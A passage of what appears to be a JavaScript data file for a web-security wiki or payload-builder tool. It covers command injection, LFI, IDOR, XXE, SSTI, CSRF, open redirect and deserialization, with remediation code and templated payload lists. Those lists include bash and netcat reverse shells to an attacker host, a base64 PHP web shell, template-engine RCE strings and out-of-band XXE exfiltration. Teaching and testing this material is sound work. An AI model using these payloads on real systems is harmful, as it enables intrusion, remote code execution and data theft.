                { title: 'Shopify: SSRF to Root Access', url: 'https://hackerone.com/reports/446593', bounty: '$25,000' },
                { title: 'Capital One: SSRF to AWS Metadata', url: 'https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/', bounty: 'Public Breach' }
            ]
        },
        {
            id: 'wiki-4',
            title: 'Command Injection (RCE)',
            category: 'Injection',
            severity: 'Critical',
            cvss: '9.8',
            cwe: 'CWE-78',
            owasp: 'A03:2021 – Injection',
            description: 'Command Injection (or RCE) allows an attacker to execute arbitrary operating system commands on the server that is running an application. This typically occurs when an application calls out to a system shell with user-supplied data.',
            technicalDetails: {
                mechanism: 'The application passes unsafe user data to a system shell (like bash or cmd.exe) using functions like system(), exec(), or shell_exec(). Attackers inject shell operators (;, &&, |) to chain their own commands.',
                commonVulnerablePoints: [
                    'File conversion tools (ImageMagick, ffmpeg)',
                    'Administrative utilities (ping, traceroute, nslookup)',
                    'File uploaders calling antivirus scanners',
                    'Code evaluation features',
                    'Asynchronous job processors'
                ],
                databaseSpecific: {
                    'Linux': 'Sensitive files: /etc/passwd, /home/user/.ssh/id_rsa',
                    'Windows': 'Sensitive files: C:\\Windows\\win.ini, C:\\Users\\Administrator\\NTUSER.DAT',
                    'Cloud': 'Metadata services (AWS/GCP/Azure) and environment variables.'
                }
            },
            impact: {
                confidentiality: 'Access to all files on the server (source code, config, DB creds).',
                integrity: 'Ability to modify any file, deface site, install malware/backdoors.',
                availability: 'Delete system files, fork bombing, crashing the server.',
                businessImpact: 'Complete server takeover, lateral movement in network, extensive data breach.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify inputs that seem to interact with the OS (filenames, IPs).',
                    'Test for time delays using `sleep` or `ping`.',
                    'Use OOB techniques (DNS/HTTP) to confirm blind injection.'
                ],
                techniques: [
                    'Concatenation: ; cmd, && cmd, | cmd, || cmd',
                    'Command substitution: `cmd`, $(cmd)',
                    'Input redirection: < /etc/passwd',
                    'Environment variable injection'
                ],
                advanced: [
                    'Space obfuscation ({cat,/etc/passwd} or ${IFS})',
                    'Character filtering bypass (e.g., using octal/hex)',
                    'Polyglot payloads for different shells',
                    'Memory corruption to achieve RCE (binary exploitation)'
                ]
            },
            remediation: {
                immediate: [
                    'Avoid calling system commands directly.',
                    'Use language-specific APIs instead (e.g., standard library for file ops).',
                    'Use `execFile` instead of `exec` to avoid shell interpretation.'
                ],
                longTerm: [
                    'Run application with minimal privileges (least privilege).',
                    'Containerize applications (Docker) to limit impact.',
                    'Implement strict input validation (whitelist allowed characters).',
                    'Use SE-Linux or AppArmor profiles.'
                ],
                codeExample: `// Vulnerable
exec("ping -c 1 " + userInput);

// Secure (Node.js)
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', userInput], (error, stdout) => { ... });`
            },
            testing: {
                manual: [
                    'Try time-based payloads: sleep 10, ping -n 10 127.0.0.1',
                    'Test output redirection: > /var/www/html/out.txt',
                    'Use OOB interactions (curl attacker.com, nslookup attacker.com)',
                    'Try simple print commands: echo "test"'
                ],
                automated: [
                    'Commix (Command Injection Exploiter)',
                    'Burp Suite Scanner',
                    'Metasploit Framework'
                ],
                payload: "; cat /etc/passwd"
            },
            vectors: ['Shell Operators', 'Argument Injection'],
            tools: ['Commix', 'Burp Suite'],
            payloads: [
                "; cat [[FILE]]",
                "| [[CMD]]",
                "$(id)",
                "`ping -c 3 [[TARGET]]`",
                "& type C:\\Windows\\win.ini",
                "|| [[CMD]]",
                "%0a cat [[FILE]]",
                "; /bin/bash -i >& /dev/tcp/[[LHOST]]/[[LPORT]] 0>&1",
                "NodeJS: require('child_process').exec('nc -e /bin/sh [[LHOST]] [[LPORT]]')",
                "Python: import os; os.system('[[CMD]]')",
                "PHP: <?php system('[[CMD]]'); ?>",
                "Windows: cmd.exe /c [[CMD]]",
                "PowerShell: powershell.exe -c [[CMD]]"
            ],
            builderConfig: [
                { id: 'LHOST', label: 'Attacker IP (LHOST)', placeholder: '10.10.10.10' },
                { id: 'LPORT', label: 'Attacker Port (LPORT)', placeholder: '4444' },
                { id: 'CMD', label: 'System Command', placeholder: 'whoami' },
                { id: 'FILE', label: 'File Path', placeholder: '/etc/passwd' },
                { id: 'TARGET', label: 'Target IP', placeholder: '192.168.1.1' }
            ],
            reports: [
                { title: 'Yahoo: ImageMagick RCE', url: 'https://hackerone.com/reports/143525', bounty: '$10,000' },
                { title: 'GitLab: ExifTool RCE', url: 'https://hackerone.com/reports/1154542', bounty: '$20,000' }
            ]
        },
        {
            id: 'wiki-5',
            title: 'Local File Inclusion (LFI)',
            category: 'Server-Side',
            severity: 'High',
            cvss: '8.6',
            cwe: 'CWE-22',
            owasp: 'A01:2021 – Broken Access Control',
            description: 'Local File Inclusion (LFI) is a vulnerability where an application allows an attacker to include files on a server through the web browser. This can lead to sensitive information disclosure, XSS, and Remote Code Execution (RCE).',
            technicalDetails: {
                mechanism: 'The vulnerability occurs when an application uses user input to construct a file path for inclusion without proper validation. Attackers use directory traversal sequences (../) to escape the intended directory.',
                commonVulnerablePoints: [
                    'Page parameters (?page=contact)',
                    'Language/localization parameters (?lang=en)',
                    'File download scripts (?file=report.pdf)',
                    'Theme selection features'
                ],
                databaseSpecific: {
                    'PHP': 'Wrappers like php://filter, data://, zip://, expect://',
                    'Java': 'Class loading and XML parsing (XXE)',
                    'Node.js': 'fs.readFile() with user input'
                }
            },
            impact: {
                confidentiality: 'Disclosure of source code, configuration files, passwords, logs.',
                integrity: 'If RCE is achieved, full system compromise.',
                availability: 'DoS via reading large files (/dev/zero) or resource exhaustion.',
                businessImpact: 'Loss of intellectual property, leakage of user data, server compromise.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify parameters that load different content.',
                    'Test for null byte injection (%00) (older PHP).',
                    'Check error messages for path disclosure.'
                ],
                techniques: [
                    'Directory Traversal: ../../../etc/passwd',
                    'PHP Wrappers: php://filter/convert.base64-encode/resource=index.php',
                    'Log Poisoning: Inject PHP code into logs and include the log file',
                    'Procfs: /proc/self/environ manipulation'
                ],
                advanced: [
                    'Race conditions with session file upload',
                    'LFI via phpinfo() temporary files',
                    'Zip wrapper RCE (upload regular zip, include via zip://)'
                ]
            },
            remediation: {
                immediate: [
                    'Avoid passing user input to filesystem APIs.',
                    'Use a whitelist of allowed filenames/codes.',
                    'Validate that the resolved path starts with the expected directory.'
                ],
                longTerm: [
                    'Use indirect object references (IDs mapped to files).',
                    'Chroot the application or run in a container.',
                    'Disable `allow_url_include` in PHP configuration.',
                    'Configure open_basedir restrictions.'
                ],
                codeExample: `// Vulnerable
include($_GET['page']);

// Secure
$pages = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $pages)) {
    include($_GET['page'] . '.php');
}`
            },
            testing: {
                manual: [
                    'Try traversing to /etc/passwd or C:\\Windows\\win.ini',
                    'Test PHP wrappers to read source code',
                    'Attempt to access log files (access.log, error.log)',
                    'Check for null byte truncation'
                ],
                automated: [
                    'DotDotPwn (Fuzzer)',
                    'LFISuite',
                    'Burp Suite Scanner'
                ],
                payload: "../../../../etc/passwd"
            },
            vectors: ['Directory Traversal', 'Log Poisoning'],
            tools: ['DotDotPwn', 'LFISuite'],
            payloads: [
                "[[DEPTH]]etc/passwd",
                "php://filter/convert.base64-encode/resource=[[FILE]]",
                "....//....//....//etc/passwd",
                "C:\\Windows\\win.ini",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "expect://[[CMD]]",
                "zip://[[ZIPFILE]]#[[PHPFILE]]",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                "php://input (POST: <?php system('[[CMD]]'); ?>)",
                "file://[[FILE]]"
            ],
            builderConfig: [
                { id: 'DEPTH', label: 'Directory Traversal', placeholder: '../../../../' },
                { id: 'FILE', label: 'Target File', placeholder: 'index.php' },
                { id: 'CMD', label: 'Command (for wrappers)', placeholder: 'id' },
                { id: 'ZIPFILE', label: 'Zip Filename', placeholder: 'shell.zip' },
                { id: 'PHPFILE', label: 'PHP Filename', placeholder: 'shell.php' }
            ],
            reports: [
                { title: 'Facebook: LFI via Upload', url: 'https://www.facebook.com/whitehat/research/', bounty: '$10,000' },
                { title: 'Airbnb: LFI to RCE', url: 'https://hackerone.com/reports/783942', bounty: '$15,000' }
            ]
        },
        {
            id: 'wiki-6',
            title: 'Insecure Direct Object References (IDOR)',
            category: 'Access Control',
            severity: 'High',
            cvss: '6.5',
            cwe: 'CWE-639',
            owasp: 'A01:2021 – Broken Access Control',
            description: 'Insecure Direct Object References (IDOR) occur when an application exposes a reference to an internal implementation object, such as a file or database key, without any validation mechanism which allows attackers to manipulate these references to access unauthorized data.',
            technicalDetails: {
                mechanism: 'The application uses an identifier (like a database ID: /user/123) to retrieve an object but fails to check if the currently authenticated user is authorized to access object 123.',
                commonVulnerablePoints: [
                    'REST API endpoints (GET /api/orders/55)',
                    'Profile edit features (POST /update-profile with user_id=1)',
                    'Password reset flows',
                    'Document download URLs',
                    'Chat message history retrieval'
                ],
                databaseSpecific: {
                    'Numeric IDs': 'Easiest to enumerate (1, 2, 3...)',
                    'UUIDs': 'Hard to guess but can be leaked nicely via other endpoints.',
                    'Hashes': 'Sometimes weak hashes (md5 of ID) are used.'
                }
            },
            impact: {
                confidentiality: 'Unauthorized viewing of other users\' private data (PII, financial info).',
                integrity: 'Unauthorized modification or deletion of other users\' data.',
                availability: 'Deleting other users\' accounts or critical resources.',
                businessImpact: 'Privacy violation fines (GDPR), massive data scrape, loss of trust.'
            },
            exploitation: {
                reconnaissance: [
                    'Register two distinct accounts (Attacker A and Victim B).',
                    'Identify features that use IDs to fetch data.',
                    'Look for IDs in URL parameters, headers, cookies, and JSON bodies.'
                ],
                techniques: [
                    'Basic ID swapping: Change ID_A to ID_B.',
                    'HTTP Parameter Pollution: ?id=A&id=B (server might process B).',
                    'ID wrapping: Change ID to [ID] or {"id":ID} (JSON type confusion).',
                    'Method tampering: Change GET to POST/PUT/DELETE.'
                ],
                advanced: [
                    'Blind IDOR: Error messages change when accessing existing vs non-existing IDs.',
                    'GUID prediction (rare but possible with older algorithms).',
                    'Chaining with Info Leak to discover UUIDs.'
                ]
            },
            remediation: {
                immediate: [
                    'Implement ownership checks on every object access.',
                    'Use session data to identify the user, not client-supplied inputs.',
                    'Use indirect reference maps (session-stored map: 1 -> Real_ID).'
                ],
                longTerm: [
                    'Framework-level access control (middleware).',
                    'Use random, non-sequential IDs (UUID v4).',
                    'Automated testing with multi-user context.'
                ],
                codeExample: `// Vulnerable
app.get('/order/:id', (req, res) => {
    db.query('SELECT * FROM orders WHERE id = ?', [req.params.id]);
});

// Secure
app.get('/order/:id', (req, res) => {
    db.query('SELECT * FROM orders WHERE id = ? AND user_id = ?', 
        [req.params.id, req.session.userId]);
});`
            },
            testing: {
                manual: [
                    'Capture request for User A, replay with User B\'s session cookie but User A\'s ID.',
                    'Capture request, change ID to another number.',
                    'Try creating objects for other users.'
                ],
                automated: [
                    'Burp Suite (AuthMatrix plugin)',
                    'Authorize (Burp Extension)',
                    'Postman Collection Runner'
                ],
                payload: "Change ID parameter"
            },
            vectors: ['Parameter Tampering', 'UUID Prediction'],
            tools: ['Burp Suite (AuthMatrix)', 'Postman'],
            payloads: [
                "Change ?id=[[ID1]] to ?id=[[ID2]]",
                "Change user_id in JSON body: {\"user_id\":[[ID2]]}",
                "Replace your UUID with victim's UUID: [[UUID]]",
                "Identify predictable increments (user/[[ID1]], user/[[ID2]])",
                "HTTP Pollution: ?id=[[ID1]]&id=[[ID2]]",
                "Wrap ID in array: {'id': [[[ID2]]]}",
                "Wildcard ID: *",
                "Test various formats: /api/users/[[ID2]]/profile"
            ],
            builderConfig: [
                { id: 'ID1', label: 'Your ID', placeholder: '100' },
                { id: 'ID2', label: 'Target ID', placeholder: '101' },
                { id: 'UUID', label: 'Target UUID', placeholder: 'a1b2c3d4-e5f6-7890' }
            ],
            reports: [
                { title: 'Uber: Mass Account Takeover via IDOR', url: 'https://hackerone.com/reports/331390', bounty: '$12,000' },
                { title: 'GitLab: IDOR deleting any issue', url: 'https://hackerone.com/reports/409605', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-7',
            title: 'XML External Entity (XXE)',
            category: 'Injection',
            severity: 'High',
            cvss: '8.2',
            cwe: 'CWE-611',
            owasp: 'A05:2021 – Security Misconfiguration',
            description: 'XML External Entity (XXE) injection occurs when an XML parser is weakly configured to process input containing a reference to an external entity. This can lead to the disclosure of confidential data, denial of service, and other system impacts.',
            technicalDetails: {
                mechanism: 'The attacker defines a custom XML entity (variable) that points to a system file or external URL. When the parser processes the XML, it expands this entity and includes the content inline.',
                commonVulnerablePoints: [
                    'SOAP API endpoints',
                    'File uploads (SVG images, DOCX files, PPTX)',
                    'SAML authentication (XML-based)',
                    'XML-RPC interfaces'
                ],
                databaseSpecific: {
                    'Blind XXE': 'Data is exfiltrated to an attacker-controlled server (OOB).',
                    'Error-based': 'File content is returned in parser error messages.',
                    'Billion Laughs': 'Recursive entity expansion causing DoS.'
                }
            },
            impact: {
                confidentiality: 'Reading local files (/etc/passwd, C:\\boot.ini).',
                integrity: 'SSRF attacks via the parser (scanning internal ports).',
                availability: 'Denial of Service (DoS) via "Billion Laughs" attack.',
                businessImpact: 'Server compromise, internal network mapping, service disruption.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify endpoints consuming XML (Content-Type: application/xml).',
                    'Test if DTDs are allowed by defining a harmless entity.',
                    'Upload SVGs containing malicious XML.'
                ],
                techniques: [
                    'File Retrieval: <!ENTITY xxe SYSTEM "file:///etc/passwd">',
                    'SSRF: <!ENTITY xxe SYSTEM "http://internal-server/">',
                    'OOB Exfiltration: <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">',
                    'XInclude attacks'
                ],
                advanced: [
                    'Encoding bypass (UTF-16LE, CP037)',
                    'XXE inside Office documents (unzip docx, modify xml, rezip)',
                    'Expect wrapper for RCE (rare, needs PHP expect module)'
                ]
            },
            remediation: {
                immediate: [
                    'Disable DTD processing (External Entities and Doctypes) in XML parsers.',
                    'Use JSON instead of XML where possible.'
                ],
                longTerm: [
                    'Patch XML parsing libraries.',
                    'Implement positive validation for XML input.',
                    'Use SAST tools to detect insecure parser configurations.'
                ],
                codeExample: `// Vulnerable (Java)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// missing secure configuration

// Secure
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);`
            },
            testing: {
                manual: [
                    'Inject XML declaration with custom entity.',
                    'Try to reference /etc/passwd or C:\\Windows\\win.ini.',
                    'Use Burp Collaborator to detect DNS lookups (Blind XXE).',
                    'Test file uploads (SVG, Excel, Word).'
                ],
                automated: [
                    'Burp Suite Scanner',
                    'XXEinjector',
                    'Oxapose'
                ],
                payload: "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><foo>&xxe;</foo>"
            },
            vectors: ['File Retrieval', 'SSRF via XXE'],
            tools: ['XXEinjector', 'Burp Suite'],
            payloads: [
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file://[[FILE]]'> ]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'http://[[TARGET]]/'> ]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM 'http://[[ATTACKER]]/evil.dtd'> %xxe; ]>",
                "SOAP XXE: <soap:Body><!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file://[[FILE]]'> ]></soap:Body>",
                "SVG XXE: <svg xmlns='http://www.w3.org/2000/svg'><!DOCTYPE svg [ <!ENTITY xxe SYSTEM 'file://[[FILE]]'> ]><text>&xxe;</text></svg>",
                "Out-of-Band: <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM 'http://[[ATTACKER]]/'> %xxe; ]>"
            ],
            builderConfig: [
                { id: 'FILE', label: 'Target File', placeholder: '/etc/passwd' },
                { id: 'TARGET', label: 'Internal Target', placeholder: 'internal.service' },
                { id: 'ATTACKER', label: 'Attacker Server', placeholder: 'attacker.com' }
            ],
            reports: [
                { title: 'Twitter: XXE extracting /etc/passwd', url: 'https://hackerone.com/reports/248668', bounty: '$10,080' },
                { title: 'Google: XXE in Toolbar', url: 'https://hackerone.com/reports/554902', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-8',
            title: 'Server-Side Template Injection (SSTI)',
            category: 'Injection',
            severity: 'Critical',
            cvss: '9.4',
            cwe: 'CWE-1336',
            owasp: 'A03:2021 – Injection',
            description: 'Server-Side Template Injection (SSTI) happens when user input is insecurely concatenated into a template which is then rendered by a server-side template engine. This allows attackers to inject template directives, often leading to Remote Code Execution (RCE).',
            technicalDetails: {
                mechanism: 'Template engines (like Jinja2, Twig, Freemarker) use special syntax (e.g., {{ }}) to embed variables. If user input acts as the template itself rather than data passed to it, the engine evaluates the input as code.',
                commonVulnerablePoints: [
                    'Email confirmation templates',
                    'Wiki/CMS pages with rich text editing',
                    'Error pages reflecting user input',
                    'Notification message customizers'
                ],
                databaseSpecific: {
                    'Python (Jinja2/Mako)': 'Access to python built-ins via __mro__ and __subclasses__.',
                    'Java (Freemarker/Velocity)': 'Access to java.lang.Runtime for command execution.',
                    'PHP (Twig/Smarty)': 'Access to self.env or _self to call system functions.'
                }
            },
            impact: {
                confidentiality: 'Reading internal files, environment variables, keys.',
                integrity: 'Modifying application logic or data.',
                availability: 'Crashing the application or server.',
                businessImpact: 'Full server compromise (RCE), complete data breach.'
            },
            exploitation: {
                reconnaissance: [
                    'Detect template engine usage (e.g., Stack traces).',
                    'Inject specific characters: ${{<%[%\'"}}.}}',
                    'Test for arithmetic evaluation: {{7*7}} -> 49.'
                ],
                techniques: [
                    'Basic arithmetic check: {{7*7}}',
                    'Context breakout: close tags like }} or %>',
                    'Sandboxed escape: finding unsafe objects/methods.',
                    'Read/Write files via template built-ins.'
                ],
                advanced: [
                    'Polyglots for unknown engines.',
                    'Memory-only payloads (no file write RCE).',
                    'Bypassing sandboxes in newer template versions.'
                ]
            },
            remediation: {
                immediate: [
                    'Never pass user input directly as a template string.',
                    'Pass user input as named context arguments/variables only.',
                    'Enable Sandbox mode if available.'
                ],
                longTerm: [
                    'Use logic-less templates (Mustache) where possible.',
                    'Run template rendering in isolation (container/vm).',
                    'Regularly update template libraries.'
                ],
                codeExample: `// Vulnerable (Python/Flask)
return render_template_string('Hello ' + request.args.get('name'))

// Secure
return render_template('hello.html', name=request.args.get('name'))
// In hello.html: Hello {{ name }}`
            },
            testing: {
                manual: [
                    'Fuzz with {{7*7}}, ${7*7}, <%= 7*7 %>.',
                    'Check if input is reflected literally or evaluated.',
                    'Attempt to access configuration objects ({{settings}}, {{config}}).',
                    'Try to trigger debug errors for verbose output.'
                ],
                automated: [
                    'Tplmap (Automated SSTI exploitation)',
                    'Burp Suite Scanner',
                    'FFUF with SSTI wordlist'
                ],
                payload: "{{7*7}}"
            },
            vectors: ['Jinja2', 'Twig', 'Freemarker'],
            tools: ['Tplmap'],
            payloads: [
                "{{7*7}}",
                "${7*7}",
                "{{[[PAYLOAD]]}}",
                "<%= [[PAYLOAD]] %>",
                "#{[[PAYLOAD]]}",
                "Jinja2: {{config.items()}}",
                "Jinja2 RCE: {{request.application.__globals__.__builtins__.__import__('os').popen('[[CMD]]').read()}}",
                "Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('[[CMD]]')}}",
                "Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('[[CMD]]')}",
                "Java: ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(null),'[[CMD]]')}"
            ],
            builderConfig: [
                { id: 'CMD', label: 'System Command', placeholder: 'id' },
                { id: 'PAYLOAD', label: 'Template Payload', placeholder: '7*7' }
            ],
            reports: [
                { title: 'Uber: SSTI in Email Preview', url: 'https://hackerone.com/reports/125980', bounty: '$10,000' },
                { title: 'PayPal: SSTI in Marketing App', url: 'https://hackerone.com/reports/341852', bounty: '$7,500' }
            ]
        },
        {
            id: 'wiki-9',
            title: 'Cross-Site Request Forgery (CSRF)',
            category: 'Client-Side',
            severity: 'Medium',
            cvss: '6.5',
            cwe: 'CWE-352',
            owasp: 'A01:2021 – Broken Access Control',
            description: 'Cross-Site Request Forgery (CSRF) induces users to perform actions they do not intend to perform. If the victim is an administrative account, CSRF can compromise the entire web application.',
            technicalDetails: {
                mechanism: 'CSRF works because browsers automatically include cookies (session identifiers) with cross-origin requests. If an attacker tricks a user into submitting a request to a trusted site, the browser sends the cookies, and the server accepts the request as legitimate.',
                commonVulnerablePoints: [
                    'Password change forms without current password',
                    'Email update endpoints',
                    'Money transfer actions',
                    'Administrative actions (add user, delete post)'
                ],
                databaseSpecific: {
                    'Login CSRF': 'Logging a victim into the attacker\'s account to track activity.',
                    'GET-based': 'Attacks can be delivered via <img> tags.',
                    'POST-based': 'Requires hidden forms (autosubmitting).'
                }
            },
            impact: {
                confidentiality: 'Generally low (responses are blocked by SOP), but can change email to takeover.',
                integrity: 'Unauthorized actions (transfer money, change settings).',
                availability: 'Delete account or data.',
                businessImpact: 'Reputational damage, financial loss, user trust issues.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify state-changing requests (POST/PUT/DELETE).',
                    'Check for predictable parameters.',
                    'Verify absence of Anti-CSRF tokens or SameSite cookie attributes.'
                ],
                techniques: [
                    'HTML Forms: Hidden form autosubmitting via JS.',
                    'Image Tags: <img src="http://site.com/delete?id=1"> (GET only).',
                    'XHR/Fetch: If CORS is misconfigured or preflight is skipped.'
                ],
                advanced: [
                    'Bypassing Referer checks (empty referer via <meta> or data URI).',
                    'Token prediction/cracking.',
                    'Clickjacking to bypass simple CSRF protections.'
                ]
            },
            remediation: {
                immediate: [
                    'Implement Anti-CSRF Tokens (Synchronizer Token Pattern).',
                    'Use SameSite="Strict" or "Lax" for session cookies.',
                    'Verify Origin/Referer headers.'
                ],
                longTerm: [
                    'Require re-authentication for sensitive actions (Sudo mode).',
                    'Use custom request headers (X-Requested-With) for APIs.',
                    'Avoid using GET for state-changing operations.'
                ],
                codeExample: `// Vulnerable
app.post('/transfer', (req, res) => {
    // processes transfer without checking origin or token
});

// Secure (Express + CSURF)
const csrf = require('csurf');
app.use(csrf());
app.post('/transfer', (req, res) => {
    // verified by middleware
});`
            },
            testing: {
                manual: [
                    'Remove CSRF token and replay request.',
                    'Change CSRF token to another valid token (from another session).',
                    'Test if Referer header is checked (remove it).',
                    'Check SameSite cookie attributes.'
                ],
                automated: [
                    'Burp Suite Professional (Generate CSRF PoC)',
                    'CSRF Tester (OWASP ZAP)',
                    'DOM Invader'
                ],
                payload: "<img src=x>"
            },
            vectors: ['No Anti-CSRF Token', 'Weak Token Validation'],
            tools: ['Burp Suite Professional'],
            payloads: [
                "<form action='http://[[TARGET]]/change_password' method='POST' onload='submit()'><input name='password' value='[[PASSWORD]]'></form>",
                "<img src='http://[[TARGET]]/transfer_money?amount=[[AMOUNT]]'>",
                "Remove CSRF token parameter (bypass)",
                "Use GET instead of POST",
                "Change Content-Type to text/plain",
                "Referer Header Spoofing",
                "AJAX CSRF: fetch('http://[[TARGET]]/api/action', {method:'POST', credentials:'include'})"
            ],
            builderConfig: [
                { id: 'TARGET', label: 'Target URL', placeholder: 'target.com' },
                { id: 'PASSWORD', label: 'New Password', placeholder: 'hacked123' },
                { id: 'AMOUNT', label: 'Amount', placeholder: '1000' }
            ],
            reports: [
                { title: 'Facebook: CSRF Account Takeover', url: 'https://hackerone.com/reports/4710', bounty: '$5,000' },
                { title: 'Glassdoor: CSRF Profile Update', url: 'https://hackerone.com/reports/786541', bounty: '$2,000' }
            ]
        },
        {
            id: 'wiki-10',
            title: 'Open Redirect',
            category: 'Client-Side',
            severity: 'Low',
            cvss: '6.1',
            cwe: 'CWE-601',
            owasp: 'A01:2021 – Broken Access Control',
            description: 'Open Redirect occurs when a web application accepts a user-controlled input that specifies a link to an external site and uses that link in a redirect. This simplifies phishing attacks.',
            technicalDetails: {
                mechanism: 'The application takes a parameter (e.g., ?next=, ?return_to=, ?url=) and sets the `Location` header to that value without validation. Browsers then automatically navigate to that URL.',
                commonVulnerablePoints: [
                    'Login pages (redirecting after success)',
                    'SSO/OAuth flows (redirect_uri)',
                    'Site navigation or outbound link tracking',
                    'Language selectors'
                ],
                databaseSpecific: {
                    'Phishing': 'Redirecting users to a fake login page served by the attacker.',
                    'XSS Chaining': 'Redirecting to javascript:alert(1) (in older browsers).',
                    'SSRF': 'Redirecting a backend fetch mechanism to an internal resource.'
                }
            },
            impact: {
                confidentiality: 'Stealing credentials via phishing.',
                integrity: 'Low direct impact.',
                availability: 'Low direct impact.',
                businessImpact: 'Reputation damage, user trust loss, enabling other attacks (SSRF, XSS).'
            },
            exploitation: {
                reconnaissance: [
                    'Identify redirect parameters: url, next, dest, destination, go, return, return_path.',
                    'Check for javascript redirects (window.location).',
                    'Fuzz with known payloads.'
                ],
                techniques: [
                    'Basic: ?url=http://evil.com',
                    'Protocol Relative: ?url=//evil.com',
                    'Slash Bypass: ?url=\/\/evil.com, ?url=/\t/evil.com',
                    '@ Symbol: ?url=http://google.com@evil.com (browser goes to evil.com)'
                ],
                advanced: [
                    'Chain with CRLF injection to split headers.',
                    'Use open redirect to leak OAuth tokens (redirect_uri manipulation).',
                    'Bypass regex filters (unicode characters, IP vs Domain).'
                ]
            },
            remediation: {
                immediate: [
                    'Avoid using user input for redirects if possible.',
                    'Use hardcoded redirect maps (token -> URL).',
                    'Validate provided URLs against a strict whitelist of allowed domains.'
                ],
                longTerm: [
                    'Force all redirects to be relative (start with / and not //).',
                    'Display an intermediate warning page to the user.',
                    'Log monitoring for redirect abuse.'
                ],
                codeExample: `// Vulnerable
res.redirect(req.query.next);

// Secure
if (req.query.next.startsWith('/') && !req.query.next.startsWith('//')) {
    res.redirect(req.query.next);
} else {
    res.redirect('/');
}`
            },
            testing: {
                manual: [
                    'Test parameters like next, url, retUrl.',
                    'Try evasion: javascript:alert(1), data:text/html..., vbscript:...',
                    'Test filtering: https://exampel.com.evil.com'
                ],
                automated: [
                    'OpenRedirex',
                    'Burp Suite Scanner',
                    'OWASP ZAP'
                ],
                payload: "http://evil.com"
            },
            vectors: ['Phishing', 'SSRF Chaining'],
            tools: ['OpenRedirex'],
            payloads: [
                "https://[[TARGET]]/login?next=http://[[EVIL]]",
                "//[[EVIL]]",
                "///[[EVIL]]",
                "https:[[EVIL]]",
                "\\/[[EVIL]]",
                "http://[[LEGIT]]%2F@[[EVIL]]"
            ],
            builderConfig: [
                { id: 'TARGET', label: 'Target Domain', placeholder: 'example.com' },
                { id: 'EVIL', label: 'Redirect To', placeholder: 'evil.com' },
                { id: 'LEGIT', label: 'Legitimate Domain', placeholder: 'google.com' }
            ],
            reports: [
                { title: 'Google: Login Open Redirect', url: 'https://hackerone.com/reports/511252', bounty: '$1,337' },
                { title: 'Twitter: OAuth Open Redirect', url: 'https://hackerone.com/reports/123956', bounty: '$2,800' }
            ]
        },
        {
            id: 'wiki-11',
            title: 'Insecure Deserialization',
            category: 'Server-Side',
            severity: 'Critical',
            cvss: '9.8',
            cwe: 'CWE-502',
            owasp: 'A08:2021 – Software and Data Integrity Failures',
            description: 'Insecure Deserialization occurs when untrusted data is used to abuse the logic of an application, deny service, or execute arbitrary code (RCE) during the process of converting the data back into an object.',
            technicalDetails: {
                mechanism: 'Serialization converts an object state to a format (byte stream, JSON, XML) for storage/transmission. Deserialization reverses this. If the deserialization process is insecure and data is user-controlled, attackers can instantiate unsafe classes or trigger "gadget chains" (sequences of valid method calls) to execute commands.',
                commonVulnerablePoints: [
                    'API endpoints receiving serialized objects',
                    'Cookies storing serialized session data (PHP objects, Java)',
                    'View state parameters (ASP.NET)',
                    'Message queues/JMS'
                ],
                databaseSpecific: {
                    'Java': 'ReadObject() exploits, Gadget chains (Commons Collections).',
                    'PHP': '__wakeup(), __destruct() magic methods.',
                    'Python': 'Pickle/cpickle modules allow arbitrary code execution on load.',
                    'Node.js': 'node-serialize, untrusted functions in IIFE.'
                }
            },
            impact: {
                confidentiality: 'Access to files, memory dumps, environment variables.',
                integrity: 'Modifying application logic, privilege escalation.',
                availability: 'DoS loops, crashing the JVM/Service.',
                businessImpact: 'Full Remote Code Execution (RCE) often leads to complete system compromise.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify headers/params with serialized data (Base64-encoded strings usually).',
                    'Look for magic bytes (Java: ACOED0005, Python Pickle: 80 04 95).',
                    'Identify language and libraries used.'
                ],
                techniques: [
                    'Ysoserial (Java): Generate payloads for common libraries.',
                    'PHPGGC (PHP): Object injection payloads.',
                    'Pickle (Python): Create malicious pickle streams.',
                    'Type Confusion (.NET).'
                ],
                advanced: [
                    'Universal gadget chains.',
                    'Memory corruption via deserialization.',
                    'Blind deserialization (using sleep/ping to detect).'
                ]
            },
            remediation: {
                immediate: [
                    'Do not accept serialized objects from untrusted sources.',
                    'Validate the type of object before deserialization (Look-ahead).',
                    'Use digital signatures (HMAC) to verify integrity before processing.'
                ],
                longTerm: [
                    'Use safe data formats (JSON) instead of native serialization.',
                    'Run in low-privilege environments.',
                    'Keep libraries updated (gadgets are often patched).'
                ],
                codeExample: `// Vulnerable (Node.js)
var obj = serialize.unserialize(req.cookies.data);

// Secure (JSON)
var obj = JSON.parse(req.cookies.data); // JSON is generally safe from code exec`
            },
            testing: {
                manual: [
                    'Inject base64 encoded payloads in cookies/headers.',
                    'Monitor for 500 errors (often indicate failed deserialization).',
                    'Try time-delays (Thread.sleep) to confirm execution.'
                ],
